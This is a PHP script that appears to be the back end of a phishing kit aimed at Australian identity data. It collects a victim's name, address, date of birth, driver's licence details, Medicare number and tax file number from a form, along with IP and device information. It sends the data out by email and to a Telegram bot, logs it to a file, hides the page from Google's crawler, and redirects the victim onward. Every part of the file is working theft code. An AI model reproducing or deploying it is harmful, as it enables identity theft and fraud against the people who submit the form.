<?php
session_start();

include('config/email.php');
if(isset($_POST['fn'])){
	
	$ip = getenv("REMOTE_ADDR");
	$ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ infor]---------------------#\n";


$msg  .= "Full Name            : ".$_POST['fn']."\n";
	$msg  .= "Address on File            : ".$_POST['add']."\n";
	$msg  .= "Date of Birth            : ".$_POST['dob']."\n";
	$msg  .= "Driver's License Number            : ".$_POST['dln']."\n";
	$msg  .= "Driver's License Card No. (Back of Card)            : ".$_POST['dlcnum']."\n";
	$msg  .= "Driver's License Expiry Date            : ".$_POST['dlexdate']."\n";
	$msg  .= "Medicare Number            : ".$_POST['mednum']."\n";
	$msg  .= "Individual Reference Number            : ".$_POST['irn']."\n";
	$msg  .= "Tax File Number            : ".$_POST['tfnum']."\n";




$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address		: ".$ip."\n";
$msg .= "DEVICE INFORMATION		    : ".$ua."\n";
$msg .= "#-------------------[ SPY - END ]------------------------#\n\n";
$sub = "::Spy::  Online Access: $ip";
mail($to,$sub,$msg);

$apiToken = $tgbot;
$data = [
    'chat_id' => $chatid, 
    'text' => $msg,
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );    



mail($ml2,$sub,$msg);
 $data = fopen("antibot.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

header('location: vv/id.php')
?>